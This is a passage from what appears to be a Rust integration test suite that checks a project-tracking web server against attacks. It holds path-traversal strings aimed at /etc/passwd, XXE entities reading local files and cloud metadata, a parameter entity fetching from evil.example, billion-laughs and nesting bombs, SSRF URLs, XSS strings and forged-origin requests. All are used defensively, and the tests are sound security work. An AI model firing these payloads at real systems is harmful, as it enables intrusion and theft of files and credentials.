    assert!(all.contains("&lt;img src=3Dx onerror=3Dalert(1)&gt;") || all.contains("&lt;img src=x onerror=alert(1)&gt;"), "the title is there, as text");
    assert!(all.contains("&lt;script&gt;alert(document.cookie)&lt;/script&gt;"), "the message is there, as text");
}

#[tokio::test]
async fn files_outside_the_served_folders_cannot_be_read() {
    let app = spawn().await;
    let root = app.admin().await;
    // A secret beside the web folder, a page inside it, and a manual.
    let web = app.st.cfg.server.web_root.clone();
    let manual = app.st.cfg.server.manual_root.clone();
    std::fs::write(web.parent().unwrap().join("secret.txt"), MARK).unwrap();
    std::fs::create_dir_all(web.join("assets")).unwrap();
    std::fs::write(web.join("assets/app.js"), "console.log('app')").unwrap();
    std::fs::create_dir_all(&manual).unwrap();
    std::fs::write(manual.join("index.html"), "<!doctype html><title>Manual</title>").unwrap();
    assert_eq!(app.http.get(format!("{}/assets/app.js", app.base)).send().await.unwrap().text().await.unwrap(), "console.log('app')");
    assert!(app.http.get(format!("{}/manual/", app.base)).send().await.unwrap().text().await.unwrap().contains("Manual"));
    // Raw sockets, because an HTTP client tidies `..` away before sending.
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let addr = app.base.trim_start_matches("http://").to_string();
    for path in [
        "/../secret.txt", "/assets/../../secret.txt", "/%2e%2e/secret.txt", "/assets/%2e%2e/%2e%2e/secret.txt", "/..%2fsecret.txt", "/assets/..%2f..%2fsecret.txt", "/%2e%2e%2fsecret.txt",
        "/manual/../../secret.txt", "/manual/%2e%2e/%2e%2e/secret.txt", "/manual/..%2f..%2fsecret.txt", "/manual/..%5c..%5csecret.txt", "/assets/....//....//secret.txt",
        "//secret.txt", "/assets//../../secret.txt", "/..;/secret.txt", "/assets/%252e%252e/%252e%252e/secret.txt", "/vendor/../../secret.txt", "/vendor/%2e%2e/%2e%2e/secret.txt",
        "/../../../../../../etc/passwd", "/assets/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/manual/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/assets/app.js%00.png", "/etc/passwd", "/assets/\\..\\..\\secret.txt",
    ] {
        let mut s = tokio::net::TcpStream::connect(&addr).await.unwrap();
        s.write_all(format!("GET {path} HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\n\r\n").as_bytes()).await.unwrap();
        let mut buf = vec![];
        let _ = tokio::time::timeout(Duration::from_secs(5), s.read_to_end(&mut buf)).await;
        let text = String::from_utf8_lossy(&buf);
        assert!(!text.contains(MARK) && !text.contains("root:x:0:0"), "{path} read a file it should not:\n{}", text.chars().take(300).collect::<String>());
        assert!(!text.starts_with("HTTP/1.1 5"), "{path}: {}", text.lines().next().unwrap_or_default());
    }
    // Add-on packs are found by id in the add-on folder, not by path.
    for id in ["../crates/gantry-server/packs/core", "..%2f..%2fcore", "nasa/../../x", "/etc/passwd", "nasa%00", ".", ".."] {
        let (s, v) = root.post(&format!("/api/v1/admin/packs/{}/install", enc(id)), json!({})).await;
        assert!(s.is_client_error(), "{id}: {s} {v}");
        assert!(!v.to_string().contains("No such file") && !v.to_string().contains("os error"), "{v}");
    }
    assert_eq!(sqlx::query_scalar::<_, i64>("SELECT count(*) FROM packs").fetch_one(&app.st.db).await.unwrap(), 1, "nothing was installed");
}

#[tokio::test]
async fn xml_from_outside_cannot_name_files_or_grow_without_bound() {
    let app = spawn().await;
    let root = app.admin().await;
    let import = |xml: String| {
        let root = root.clone();
        async move {
            let started = Instant::now();
            let (s, v) = root.post("/api/v1/admin/auth-providers/saml-metadata", json!({"xml": xml})).await;
            (s, v, started.elapsed())
        }
    };
    let good = r#"<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://idp.example/"><IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://idp.example/sso"/></IDPSSODescriptor></EntityDescriptor>"#;
    let (s, v, _) = import(good.to_string()).await;
    assert_eq!((s, v["issuer"].as_str(), v["sso_url"].as_str()), (StatusCode::OK, Some("https://idp.example/"), Some("https://idp.example/sso")));
    let entity = |decl: &str, use_it: &str| format!(r#"<?xml version="1.0"?><!DOCTYPE x [{decl}]>{}"#, good.replace("https://idp.example/sso", use_it));
    let mut laughs = String::from(r#"<!ENTITY a0 "ha">"#);
    for n in 1..30 {
        laughs.push_str(&format!(r#"<!ENTITY a{n} "&a{};&a{};&a{};&a{};&a{};&a{};&a{};&a{};&a{};&a{};">"#, n - 1, n - 1, n - 1, n - 1, n - 1, n - 1, n - 1, n - 1, n - 1, n - 1));
    }
    for (what, xml) in [
        ("an entity naming a local file", entity(r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#, "&xxe;")),
        ("an entity naming an address", entity(r#"<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">"#, "&xxe;")),
        ("a parameter entity", entity(r#"<!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p;"#, "x")),
        ("entities that expand a billion times", entity(&laughs, "&a29;")),
        ("an empty document type", entity("", "https://idp.example/sso")),
        ("elements nested a hundred thousand deep", format!("{}{}", "<a>".repeat(100_000), "</a>".repeat(100_000))),
        ("a hundred thousand attributes", format!("<a {}/>", (0..100_000).map(|n| format!("a{n}=\"1\"")).collect::<Vec<_>>().join(" "))),
        ("half a million elements", format!("<a>{}</a>", "<b/>".repeat(500_000))),
        ("something that is not XML", "\u{0}\u{1}\u{2} <<<< &&&&".to_string()),
    ] {
        let (s, v, took) = import(xml).await;
        assert!(s.is_client_error(), "{what}: {s} {v}");
        assert!(took < Duration::from_secs(3), "{what} took {took:?}");
        assert!(!v.to_string().contains("root:") && !v.to_string().contains("hahaha"), "{what}: {v}");
    }
    // Fetching metadata by address is an outbound request like any other.
    for url in ["file:///etc/passwd", "gopher://127.0.0.1:25/", "ftp://example.org/x", "https://user:pw@idp.example/metadata", "not a url", "https://[::ffff:169.254.169.254]/latest/meta-data/", "https://169.254.169.254/latest/meta-data/"] {
        let (s, v) = root.post("/api/v1/admin/auth-providers/saml-metadata", json!({"url": url})).await;
        assert_eq!(s, StatusCode::BAD_REQUEST, "{url}: {v}");
    }
    // The sign-in endpoint itself takes XML from anyone on the network.
    let provider = root.created("/api/v1/admin/auth-providers", json!({"name": "Corp", "kind": "saml", "issuer": "https://idp.example/", "config": {"sso_url": "https://idp.example/sso", "certificates": [include_str!("fixtures/saml/idp-cert.pem")]}})).await;
    let acs = format!("{}/api/v1/auth/saml/{}/acs", app.base, provider["id"].as_str().unwrap());
    use base64::Engine;
    for (what, xml) in [("an entity", entity(r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#, "&xxe;")), ("deep nesting", format!("{}{}", "<a>".repeat(100_000), "</a>".repeat(100_000))), ("nothing", String::new())] {
        let started = Instant::now();
        let r = app.http.post(&acs).form(&[("SAMLResponse", base64::engine::general_purpose::STANDARD.encode(&xml)), ("RelayState", "x".to_string())]).send().await.unwrap();
        assert!(r.status().is_client_error() || r.status().is_redirection(), "{what}: {}", r.status());
        let location = r.headers().get("location").map(|l| l.to_str().unwrap().to_string()).unwrap_or_default();
        assert!(location.is_empty() || location.starts_with("/login"), "{what}: sent to {location}");
        assert!(started.elapsed() < Duration::from_secs(3), "{what} took {:?}", started.elapsed());
        assert!(!r.text().await.unwrap().contains("root:"));
    }
    let r = app.http.post(&acs).form(&[("SAMLResponse", "%%% not base64 %%%"), ("RelayState", "x")]).send().await.unwrap();
    assert!(!r.status().is_server_error() && !r.status().is_success());
}

#[tokio::test]
async fn malformed_oversized_and_expensive_requests_are_refused_quickly() {
    let app = spawn_with(|c| c.server.max_body_mb = 2).await;
    let ada = app.user("ada@example.org", "member").await;
    ada.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "basic"})).await;
    ada.created("/api/v1/projects/OPS/items", json!({"title": "Target"})).await;
    let raw = |body: Vec<u8>, ctype: &'static str| {
        let ada = ada.clone();
        async move {
            let started = Instant::now();
            let r = ada.request(Method::POST, "/api/v1/projects/OPS/items").header("content-type", ctype).body(body).send().await.unwrap();
            (r.status(), started.elapsed())
        }
    };
    for (what, body) in [
        ("arrays nested a hundred thousand deep", [b"[".repeat(100_000), b"]".repeat(100_000)].concat()),
        ("objects nested fifty thousand deep", [br#"{"a":"#.repeat(50_000), b"1".to_vec(), b"}".repeat(50_000)].concat()),
        ("a number with a million digits", format!(r#"{{"title": "x", "priority": {}}}"#, "9".repeat(1_000_000)).into_bytes()),
        ("the same key ten thousand times", format!("{{{}}}", (0..10_000).map(|_| r#""title":"x""#).collect::<Vec<_>>().join(",")).into_bytes()),
        ("bytes that are not UTF-8", vec![b'{', b'"', 0xff, 0xfe, 0xfd, b'"', b':', b'1', b'}']),
        ("a truncated document", br#"{"title": "x", "labels": ["a", "#.to_vec()),
        ("nothing", vec![]),
        ("a byte order mark and a newline", b"\xef\xbb\xbf\n".to_vec()),
    ] {
        let (s, took) = raw(body, "application/json").await;
        assert!(s.is_client_error(), "{what}: {s}");
        assert!(took < Duration::from_secs(3), "{what} took {took:?}");
    }
    // A body must say it is JSON; a form posted from another site does not.
    for ctype in ["text/plain", "application/x-www-form-urlencoded", "multipart/form-data; boundary=x"] {
        assert_eq!(raw(br#"{"title": "From a form"}"#.to_vec(), ctype).await.0, StatusCode::UNSUPPORTED_MEDIA_TYPE, "{ctype}");
    }
    assert_eq!(raw(vec![b' '; 3 * 1024 * 1024], "application/json").await.0, StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(ada.ok("/api/v1/items?project=OPS").await["total"], 1, "none of it created anything");
    // Headers that claim another method, path or address change nothing.
    let r = ada.request(Method::GET, "/api/v1/items/OPS-1").header("x-http-method-override", "DELETE").header("x-original-url", "/api/v1/admin/users").header("x-rewrite-url", "/api/v1/admin/users").header("x-forwarded-host", "evil.example").send().await.unwrap();
    assert_eq!(r.json::<Value>().await.unwrap()["title"], "Target");
    assert_eq!(ada.ok("/api/v1/items/OPS-1").await["title"], "Target");
    for m in ["TRACE", "CONNECT", "PROPFIND", "PURGE"] {
        let s = ada.request(Method::from_bytes(m.as_bytes()).unwrap(), "/api/v1/items/OPS-1").send().await.map(|r| r.status().as_u16()).unwrap_or(400);
        assert!((400..500).contains(&s), "{m}: {s}");
    }

    // Text that is costly to read: thousands of things that look like references and mentions.
    for (what, text) in [
        ("mentions", "@a ".repeat(20_000)),
        ("item keys", "OPS-1 ".repeat(10_000)),
        ("distinct item keys", (0..10_000).map(|n| format!("OPS-{n} ")).collect::<String>()),
        ("unclosed wiki links", "[[".repeat(30_000)),
        ("wiki links", "[[x]]".repeat(12_000)),
        ("nested brackets", format!("{}x{}", "[".repeat(30_000), "]".repeat(30_000))),
        ("backticks", "`".repeat(60_000)),
        ("at signs", "@".repeat(60_000)),
        ("one long word", "a".repeat(60_000)),
    ] {
        let started = Instant::now();
        let (s, v) = ada.post("/api/v1/items/OPS-1/comments", json!({"body": text})).await;
        assert!(s == StatusCode::CREATED || s == StatusCode::BAD_REQUEST, "{what}: {s} {v}");
        let (s2, _) = ada.post("/api/v1/refs/preview", json!({"text": text})).await;
        assert!(!s2.is_server_error(), "{what}: preview {s2}");
        assert!(started.elapsed() < Duration::from_secs(4), "{what} took {:?}", started.elapsed());
        if s == StatusCode::CREATED {
            let refs = &v["refs"];
            let count: usize = ["items", "users", "pages", "projects"].iter().map(|k| refs[*k].as_object().map(|o| o.len()).unwrap_or(0)).sum();
            assert!(count <= 200, "{what}: {count} references in one message");
        }
    }
    let started = Instant::now();
    assert_eq!(ada.ok("/api/v1/items/OPS-1").await["key"], "OPS-1");
    assert!(started.elapsed() < Duration::from_secs(3), "reading the discussion back took {:?}", started.elapsed());
    // A search for nothing in particular, as wide as it can be asked.
    let started = Instant::now();
    let (s, _) = ada.post("/api/v1/items/query", json!({"criteria": (0..40).map(|n| json!({"field": "text", "op": "contains", "value": format!("%{}%", "_%".repeat(200 + n))})).collect::<Vec<_>>(), "limit": 1_000_000})).await;
    assert_eq!(s, StatusCode::OK);
    assert!(started.elapsed() < Duration::from_secs(3));
}

#[tokio::test]
async fn fields_that_are_not_the_callers_to_set_are_refused_or_ignored() {
    let app = spawn().await;
    let root = app.admin().await;
    let ada = app.user("ada@example.org", "member").await;
    let ben = app.user("ben@example.org", "member").await;
    ada.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "basic"})).await;
    ada.created("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "project_member"})).await;
    root.created("/api/v1/projects", json!({"key": "ADM", "name": "Admin only", "template": "basic"})).await;
    // New work is its creator's, starts at the beginning, and is numbered by the server.
    for extra in [json!({"id": NIL}), json!({"number": 999}), json!({"reporter_id": ada.user_id}), json!({"project_id": NIL}), json!({"status": "done"}), json!({"status_category": "done"}), json!({"created_at": "2001-01-01T00:00:00Z"}), json!({"channel": "import"}), json!({"archived": true}), json!({"lenient": true}), json!({"parent_id": NIL}), json!({"request_type_id": NIL})] {
        let mut body = json!({"title": "Ben's"});
        body.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
        let (s, v) = ben.post("/api/v1/projects/OPS/items", body.clone()).await;
        assert!(s.is_client_error(), "{body}: {s} {v}");
    }
    let item = ben.created("/api/v1/projects/OPS/items", json!({"title": "Ben's"})).await;
    assert_eq!((item["key"].as_str(), item["reporter"]["name"].as_str(), item["status_category"].as_str()), (Some("OPS-1"), Some("ben"), Some("todo")), "{item}");
    assert!(item["created_at"].as_str().unwrap() > "2020");
    // Changing an item cannot move it to another project, rewrite its history or its author.
    let adm: String = sqlx::query_scalar("SELECT id::text FROM projects WHERE key = 'ADM'").fetch_one(&app.st.db).await.unwrap();
    for body in [json!({"project_id": adm}), json!({"reporter_id": ada.user_id}), json!({"number": 7}), json!({"key": "ADM-1"}), json!({"created_at": "2001-01-01T00:00:00Z"}), json!({"status_category": "done"}), json!({"resolved_at": "2001-01-01T00:00:00Z"}), json!({"rank": "0"}), json!({"sla_resolution_breached": false}), json!({"history": []}), json!({"refs": {"items": {"ADM-1": "x"}}})] {
        let (s, v) = ben.patch("/api/v1/items/OPS-1", body.clone()).await;
        assert_eq!(s, StatusCode::BAD_REQUEST, "{body}: {v}");
    }
    let now = ben.ok("/api/v1/items/OPS-1").await;
    assert_eq!((now["key"].as_str(), now["reporter"]["name"].as_str(), now["status_category"].as_str()), (Some("OPS-1"), Some("ben"), Some("todo")));
    // A message is always its sender's, at the time it was sent.
    let c = ben.post("/api/v1/items/OPS-1/comments", json!({"body": "hello", "author_id": ada.user_id, "created_at": "2001-01-01T00:00:00Z", "refs": {"items": {"ADM-1": {"title": "x"}}}})).await;
    if c.0 == StatusCode::CREATED {
        assert_eq!(c.1["author"]["name"], "ben");
        assert_eq!(c.1["refs"], json!({}));
    } else {
        assert!(c.0.is_client_error());
    }
    // Pages.
    ada.created("/api/v1/spaces", json!({"key": "DOC", "name": "Docs", "access": "internal"})).await;
    for extra in [json!({"created_by": ben.user_id}), json!({"version": 40}), json!({"space_id": NIL}), json!({"updated_by": ben.user_id}), json!({"refs": {}}), json!({"stage": "approved"})] {
        let mut body = json!({"title": "Page", "content": "x"});
        body.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
        let (s, v) = ada.post("/api/v1/spaces/DOC/pages", body.clone()).await;
        assert!(s.is_client_error(), "{body}: {s} {v}");
    }
    let page = ada.created("/api/v1/spaces/DOC/pages", json!({"title": "Page", "content": "x"})).await;
    assert_eq!((page["version"].as_i64(), page["created_by_user"]["name"].as_str()), (Some(1), Some("ada")), "{page}");
    // Accounts: nobody promotes themselves, becomes someone else, or sets their own password hash.
    for body in [json!({"role": "system_admin"}), json!({"roles": ["system_admin"]}), json!({"kind": "agent"}), json!({"active": false}), json!({"email": "root@example.org"}), json!({"id": root.user_id}), json!({"password_hash": "x"}), json!({"agent_policy": {"mode": "unrestricted"}}), json!({"mfa": false}), json!({"failed_logins": 0}), json!({"locked_until": null})] {
        let (s, v) = ben.patch("/api/v1/auth/me", body.clone()).await;
        assert!(s.is_client_error(), "{body}: {s} {v}");
    }
    let me = ben.ok("/api/v1/auth/me").await;
    assert_eq!((me["user"]["email"].as_str(), me["user"]["kind"].as_str()), (Some("ben@example.org"), Some("human")));
    assert!(!me["permissions"].as_array().unwrap().contains(&json!("admin.users")), "{me}");
    // Tokens are for oneself, with no more than one's own reach.
    let (s, t) = ben.post("/api/v1/auth/tokens", json!({"name": "mine", "scopes": ["read"], "user_id": root.user_id})).await;
    if s.is_success() {
        let as_token = Caller { token: Some(t["token"].as_str().unwrap().to_string()), ..app.anon() };
        assert_eq!(as_token.ok("/api/v1/auth/me").await["user"]["email"], "ben@example.org");
    }
    assert!(ben.post("/api/v1/auth/tokens", json!({"name": "wide", "scopes": ["read", "write", "admin", "*"]})).await.0.is_client_error());
    // Membership: a project administrator hands out project roles, not global ones, and not in other projects.
    for (path, body) in [
        ("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "system_admin"})),
        ("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "app_admin"})),
        ("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "space_admin"})),
        ("/api/v1/projects/ADM/members", json!({"user_id": ada.user_id, "role": "project_admin"})),
    ] {
        let (s, v) = ada.post(path, body.clone()).await;
        assert!(s.is_client_error(), "{path} {body}: {s} {v}");
    }
    // Naming another scope alongside changes nothing: the role is given in the project of the address, or not at all.
    let (s, _) = ada.post("/api/v1/projects/OPS/members", json!({"user_id": ben.user_id, "role": "project_viewer", "scope_id": adm, "scope_type": "global", "project": "ADM"})).await;
    assert!(s.is_client_error() || s == StatusCode::CREATED);
    assert_eq!(sqlx::query_scalar::<_, i64>("SELECT count(*) FROM role_bindings WHERE user_id = ANY($1) AND (scope_type = 'global' OR scope_id::text = $2) AND created_at > now() - interval '1 minute' AND role_id NOT IN (SELECT id FROM roles WHERE key = 'member')").bind(vec![ada.user_id, ben.user_id]).bind(&adm).fetch_one(&app.st.db).await.unwrap(), 0);
    assert_eq!(ada.get("/api/v1/projects/ADM").await.0, StatusCode::NOT_FOUND);
    assert_eq!(ben.get("/api/v1/projects/ADM").await.0, StatusCode::NOT_FOUND);
    assert_eq!(sqlx::query_scalar::<_, i64>("SELECT count(*) FROM role_bindings b JOIN roles r ON r.id = b.role_id WHERE b.user_id = ANY($1) AND r.key IN ('system_admin', 'app_admin')").bind(vec![ada.user_id, ben.user_id]).fetch_one(&app.st.db).await.unwrap(), 0);
    // Saved things keep their owner.
    for (path, body) in [
        ("/api/v1/dashboards", json!({"name": "D", "owner_id": root.user_id})),
        ("/api/v1/visualizations", json!({"name": "V", "library": "html", "owner_id": root.user_id})),
        ("/api/v1/gantt", json!({"name": "G", "scope": {"project": "OPS"}, "owner_id": root.user_id})),
        ("/api/v1/searches", json!({"name": "S", "query": {}, "owner_id": root.user_id})),
    ] {
        assert!(ben.post(path, body.clone()).await.0.is_client_error(), "{path} {body}");
    }
}

#[tokio::test]
async fn another_site_cannot_read_or_act_through_a_signed_in_browser() {
    let app = spawn().await;
    let ada = app.user("ada@example.org", "member").await;
    ada.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "basic"})).await;
    ada.created("/api/v1/projects/OPS/items", json!({"title": "Target"})).await;
    // Reads from another origin get no permission to be read: the browser discards the answer.
    for path in ["/api/v1/auth/me", "/api/v1/items/OPS-1", "/api/v1/about", "/api/v1/sandbox/frame", "/"] {
        let r = ada.request(Method::GET, path).header("origin", "https://evil.example").send().await.unwrap();
        for h in ["access-control-allow-origin", "access-control-allow-credentials"] {
            assert!(r.headers().get(h).is_none(), "{path} sent {h}");
        }
    }
    // Asking permission first is answered with no permission.
    let r = ada.request(Method::OPTIONS, "/api/v1/items/OPS-1").header("origin", "https://evil.example").header("access-control-request-method", "PATCH").header("access-control-request-headers", "content-type,x-csrf-token").send().await.unwrap();
    assert!(r.headers().get("access-control-allow-origin").is_none() && r.headers().get("access-control-allow-methods").is_none());
    // Changes need the token only the application's own pages can read, and the application's own origin.
    let cookie = ada.cookie.clone().unwrap();
    let csrf = ada.csrf.clone().unwrap();
    let bare = |with_token: bool, origin: Option<&'static str>| {
        let mut r = app.http.patch(format!("{}/api/v1/items/OPS-1", app.base)).header("cookie", &cookie).json(&json!({"title": "Changed from elsewhere"}));
        if with_token {
            r = r.header("x-gantry-csrf", &csrf);
        }
        if let Some(o) = origin {
            r = r.header("origin", o);
        }
        r
    };
    assert_eq!(bare(false, None).send().await.unwrap().status(), StatusCode::FORBIDDEN);
    assert_eq!(bare(false, Some("https://evil.example")).send().await.unwrap().status(), StatusCode::FORBIDDEN);
    assert_eq!(bare(true, Some("https://evil.example")).send().await.unwrap().status(), StatusCode::FORBIDDEN, "even with the token, not from another origin");
    assert_eq!(bare(true, Some("null")).send().await.unwrap().status(), StatusCode::FORBIDDEN, "a sandboxed frame has no origin of its own");
    assert_eq!(ada.ok("/api/v1/items/OPS-1").await["title"], "Target");
    let own: &'static str = Box::leak(app.base.clone().into_boxed_str());
    assert_eq!(bare(true, Some(own)).send().await.unwrap().status(), StatusCode::OK);
    // The session cookie is not readable by script and is not sent along with requests from other sites.
    let r = app.http.post(format!("{}/api/v1/auth/login", app.base)).json(&json!({"email": "ada@example.org", "password": "correct horse battery staple"})).send().await.unwrap();
    let cookies: Vec<String> = r.headers().get_all("set-cookie").iter().map(|c| c.to_str().unwrap().to_string()).collect();
    let session = cookies.iter().find(|c| c.contains("HttpOnly")).expect("a session cookie");
    assert!(session.contains("SameSite=Lax") || session.contains("SameSite=Strict"), "{session}");
    // Private answers are not kept by caches between the browser and the server.
    for path in ["/api/v1/auth/me", "/api/v1/items/OPS-1", "/api/v1/notifications"] {
        assert_eq!(ada.request(Method::GET, path).send().await.unwrap().headers()["cache-control"], "no-store", "{path}");
    }
    let avatar = ada.request(Method::GET, &format!("/api/v1/users/{}/avatar", ada.user_id)).send().await.unwrap();
    assert!(avatar.headers()["cache-control"].to_str().unwrap().contains("private"), "{:?}", avatar.headers()["cache-control"]);
    assert_eq!(app.anon().get(&format!("/api/v1/users/{}/avatar", ada.user_id)).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn the_real_time_connection_withstands_floods_and_nonsense() {
    let app = spawn_with(|c| c.realtime.max_messages_per_second = 20).await;
    let ada = app.user("ada@example.org", "member").await;
    ada.created("/api/v1/projects", json!({"key": "OPS", "name": "Ops", "template": "basic"})).await;
    ada.created("/api/v1/projects/OPS/items", json!({"title": "Shared"})).await;
    // A flood ends the connection that sent it, and only that one.
    let mut calm = Ws::connect(&app, &ada).await;
    calm.subscribe("item:OPS-1").await;
    let mut loud = Ws::connect(&app, &ada).await;
    for n in 0..2_000 {
        if loud.try_send(json!({"t": "presence", "room": "item:OPS-1", "state": {"n": n}})).await.is_err() {
            break;
        }
    }
    let mut closed = false;
    for _ in 0..40 {
        if loud.try_send(json!({"t": "sub", "room": "work"})).await.is_err() || loud.closed(100).await {
            closed = true;
            break;
        }
    }
    assert!(closed, "the flooding connection was not closed");
    assert!(app.security_kinds().await.contains(&"ws.flood".to_string()));
    assert_eq!(calm.subscribe("project:OPS").await["t"], "joined", "other connections carry on");
    // Messages too large to be anything the application sends.
    let mut big = Ws::connect(&app, &ada).await;
    let _ = big.try_send(json!({"t": "presence", "room": "item:OPS-1", "state": {"blob": "x".repeat(4 * 1024 * 1024)}})).await;
    assert!(big.closed(2_000).await || big.next(500).await.is_some_and(|m| m["t"] == "error"), "an oversized message is refused");
    // Raw bytes and things that are not messages at all.
    let mut odd = Ws::connect(&app, &ada).await;
    odd.send_raw(tokio_tungstenite::tungstenite::Message::Binary(vec![0u8, 159, 146, 150].into())).await;
    odd.send_raw(tokio_tungstenite::tungstenite::Message::Text("{not json".into())).await;
    odd.send_raw(tokio_tungstenite::tungstenite::Message::Text("[]".into())).await;
    odd.send_raw(tokio_tungstenite::tungstenite::Message::Text(json!({"t": "sub", "room": "x".repeat(5_000)}).to_string().into())).await;
    odd.send_raw(tokio_tungstenite::tungstenite::Message::Text(json!({"t": "ysync", "room": "item:OPS-1", "doc": "description"}).to_string().into())).await;
    let got = odd.drain(400).await;
    assert!(got.iter().all(|m| m["t"] == "error" || m["t"] == "denied"), "{got:?}");
    assert!(got.iter().any(|m| m["of"] == "ysync"), "a document is not shared with a connection that never joined its room: {got:?}");
    assert_eq!(odd.subscribe("item:OPS-1").await["t"], "joined", "and the connection survives nonsense");
    // Too many rooms on one connection.
    let mut wide = Ws::connect(&app, &ada).await;
    let mut refused = false;
    for n in 0..300 {
        if wide.try_send(json!({"t": "sub", "room": if n % 2 == 0 { "work" } else { "planning" }})).await.is_err() {
            refused = true;
            break;
        }
        tokio::time::sleep(Duration::from_millis(60)).await;
        if n > 20 {
            break;
        }
    }
    assert!(!refused, "repeating a subscription is harmless");
    assert!(app.st.hub.connections() <= 4);
    // The server is none the worse.
    assert_eq!(ada.ok("/api/v1/items/OPS-1").await["title"], "Shared");
}
